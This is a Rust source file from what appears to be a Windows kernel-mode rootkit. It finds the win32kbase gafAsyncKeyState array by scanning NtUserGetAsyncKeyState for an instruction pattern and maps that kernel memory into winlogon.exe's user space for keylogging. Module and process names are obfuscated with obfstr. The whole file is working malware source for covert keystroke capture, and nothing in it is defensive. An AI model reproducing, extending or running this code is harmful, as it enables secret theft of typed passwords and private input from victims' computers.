use {
    obfstr::obfstr,
    core::{mem::size_of, ptr::null_mut, ffi::c_void},
    crate::{
        process::Process, 
        utils::{
            process_attach::ProcessAttach,
            get_process_by_name, patterns::scan_for_pattern, 
            address::{get_address_asynckey, get_module_base_address}, 
        }
    }, 
    wdk_sys::{
        ntddk::{
            IoAllocateMdl, IoFreeMdl, MmBuildMdlForNonPagedPool, 
            MmMapLockedPagesSpecifyCache, MmIsAddressValid
        },
        _MEMORY_CACHING_TYPE::MmCached, 
        _MM_PAGE_PRIORITY::NormalPagePriority, 
        _MODE::UserMode,
    }
};

/// Variable holding a user space address for keylogger functionality.
pub static mut USER_ADDRESS: usize = 0; 

/// Retrieves the address of gafAsyncKeyState and maps it to the user mode of winlogon.exe.
///
/// # Return
///
/// - `Option<*mut c_void>`: If successful, the address will be returned as Some, if not found, it will be returned as None.
///
pub unsafe fn get_user_address_keylogger() -> Option<*mut c_void> {
    let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
    let winlogon_process = Process::new(pid)?;
    let attach_process = ProcessAttach::new(winlogon_process.e_process);
    let gaf_async_key_state_address = get_gafasynckeystate_address()?;

    // Check that the address is valid
    if MmIsAddressValid(gaf_async_key_state_address as *mut c_void) == 0 {
        log::info!("Invalid or pagable gafAsyncKeyState address");
        return None;
    }

    // Allocates the MDL to memory
    let mdl = IoAllocateMdl(gaf_async_key_state_address as _, size_of::<[u8; 64]>() as u32, 0, 0, null_mut());
    if mdl.is_null() {
        log::info!("IoAllocateMdl Failed");
        return None;
    }

    MmBuildMdlForNonPagedPool(mdl);

    // Maps memory to user space
    let address = MmMapLockedPagesSpecifyCache(mdl, UserMode as i8, MmCached, null_mut(), 0, NormalPagePriority as u32);
    if address.is_null() {
        log::info!("MmMapLockedPagesSpecifyCache Failed");
        IoFreeMdl(mdl);
        return None;
    }

    Some(address)
}

/// Get the address of the `gafAsyncKeyState` array.
///
/// # Returns
/// 
/// `Option<PVOID>`: The address of the `gafAsyncKeyState` array if found, otherwise `None`.
///
unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
    let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
    let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;

    // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
    // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
    let pattern = [0x48, 0x8B, 0x05];
    scan_for_pattern(function_address, &pattern, 3, 7, 0x200, i32::from_le_bytes)
}
